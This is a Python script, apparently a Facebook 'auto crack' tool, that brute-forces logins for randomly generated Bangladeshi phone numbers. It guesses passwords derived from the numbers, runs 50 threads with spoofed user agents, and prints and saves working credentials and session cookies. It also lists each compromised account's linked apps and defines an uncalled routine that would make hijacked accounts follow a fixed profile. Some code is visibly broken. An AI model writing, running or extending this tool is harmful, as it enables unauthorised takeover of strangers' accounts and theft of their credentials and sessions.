import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/se.fellings/')
logo =("""\x1b[1;97m
  ____   ___  _   _ ____   ___  _  ______  _   _ ___ 
 | __ ) / _ \| \ | |  _ \ / _ \| |/ / ___|| | | |_ _|
 |  _ \| | | |  \| | | | | | | | ' /\___ \| |_| || | 
 | |_) | |_| | |\  | |_| | |_| | . \ ___) |  _  || | 
 |____/ \___/|_| \_|____/ \___/|_|\_\____/|_| |_|___|
===================================================
[√] AUTHOR  : Shifat Bondokshi
[√] FACEBOOK: Shifat.Bondokshi
[√] GITHUB  : shifatbondokshi
[√] WATHAPP : 01927755908
[√] TOOLS   : AUTO CRACK
[√] Stetus  : FREE
[★] VIRSION : 0.1.9
====================================================""") 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m017,\033[38;5;195m018{x}')
    print(f' ===================================================')
    rk1 = '0172'
    rk2 = '0191'
    rk3 = '0185'
    rk4 = '0160'
    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE : \033[38;5;195m10000, \033[38;5;45m20000, \033[38;5;46m50000  \n \033[1;93m================\033[1;93m=================\033[1;93m===================\n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m PUT CLONING LIMIT:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m YOUR TOTAL IDS: \033[38;5;46m'+tl)
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m USE YOUR MOBILE DATA ')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m Use Flight Mode For Speed Up')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m SE.FELLINGS MY FB GROUP')
        jalan('  \x1b[1;97m===================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n ===============================================")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=wZ_pY9aMkf8AFEgFXkpkr-oo; sb=wZ_pY2-V7WuYpyeZg3yMObfx; locale=en_US; m_pixel_ratio=1.75; zsh=ASTH7pQYoHT08yS4lY8uEkh9c7JewfkA7_rFjFnPhRFIG77Mg7D4BYeEVQIy-FcQU2Fh0pNy3C9pH992nL925PUYoQ-JLYMwanULGMbLooYC29cIu7R4bpgfiKxsZrd-FsH9MesXKVfHpyZQvKHdoprzOg40JOSrs5kEemmKlUT_HGuStIe2Gcxg4-dmD98RpD7xdE3OWlWGCCYRDeqBVG1Xe1caMBTuwRylrheB1s1tFc5VnvyI2S_a5IGP4zP7RB0HA82hWnBIgse6mVzBRtUGJspsFZdGgP8Jfly1XThmzo30erITplrxNTCd_mLNUvILpgDUq5Ie3nes6yJ4UKA; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaRGxQaVRJQ19fTHhWSXNMLTY0cjFpN3p2V3dSX2JLM1VlQWJPbjZvRmdwZUZuREp4cURmbVNfRWZuMUJzRlN5ayIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpEbFBpVElDX19MeFZJc0wtNjRyMWk3enZXd1JfYkszVWVBYk9uNm9GZ3BlRm5ESnhxRGZtU19FZm4xQnNGU3lrIiwicyI6Im0ifQ%3D%3D; wd=412x828; fr=0Io6O5s8KoLgbsXZd.AWVWCswn_OAYO30YzTlbPci90x4.Bj9FoG.jZ.AAA.0.0.Bj-JWe.AWWACzCqSfI',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45mSHIFAT -OK\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHIFAT -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[SHIFAT -CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SHIFAT -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}SHIFAT{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()